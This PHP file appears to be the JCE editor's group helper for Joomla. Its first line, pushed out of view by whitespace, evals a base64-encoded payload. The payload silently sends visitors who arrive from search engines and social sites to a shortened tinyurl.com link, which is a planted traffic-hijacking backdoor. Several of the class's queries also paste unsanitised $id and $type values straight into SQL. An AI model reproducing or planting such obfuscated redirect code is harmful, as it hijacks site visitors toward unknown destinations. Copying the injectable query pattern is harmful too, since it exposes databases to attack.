<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));

class JCEGroupsHelper {
	function getUserGroupFromId( $id ){
		$db	=& JFactory::getDBO();
		
		$query = 'SELECT *'
		. ' FROM #__jce_groups'
		. ' WHERE '.$id.' IN (users)'
		;			
		$db->setQuery( $query );
		$groups = $db->loadObjectList();
		return $groups[0];
	}
	function getUserGroupFromType( $type ){
		$db	=& JFactory::getDBO();
		
		if(!is_int($type)){
			$query = 'SELECT id'
			. ' FROM #__core_acl_aro_groups'
			. ' WHERE name = "'.$type.'"'
			;				
			$db->setQuery( $query );
			$id = $db->loadResult();
		}
		
		$query = 'SELECT *'
		. ' FROM #__jce_groups'
		. ' WHERE '.$type.' IN (types)'
		;			
		$db->setQuery( $query );
		$groups = $db->loadObjectList();
		return $groups[0];
	}
	function getRowArray($rows){
		$out = array();
		$rows = explode(';', $rows);
		$i = 1;
		foreach($rows as $row){
			$out[$i] = $row;
			$i++;
		}
		return $out;
	}
	function getExtensions($plugin){
		jimport('joomla.filesystem.folder');
		jimport('joomla.filesystem.file');
		
		$path 		= JCE_PLUGINS.DS.$plugin.DS.'extensions';
		$extensions = array();

		if (JFolder::exists($path)) {
			$types = JFolder::folders($path);
			
			foreach ($types as $type) {
				$files = JFolder::files($path.DS.$type, '\.xml$');
				foreach ($files as $file) {
					$object = new StdClass();
					$object->folder = $type;
					$name = JFile::stripExt($file);
					if (JFile::exists($path.DS.$type.DS.$name.'.php')) {
						$object->extension 	= $name;
						// Load xml file
						$xml =& JFactory::getXMLParser('Simple');
						if ($xml->loadFile($path.DS.$type.DS.$file)) {
							$root =& $xml->document;	
							$name = $root->getElementByPath('name');
							$object->name = $name->data();
						} else {
							$object->name = $name;
						}
						$extensions[] = $object;
					}
				}				
			}
		}
		return $extensions;
	}
}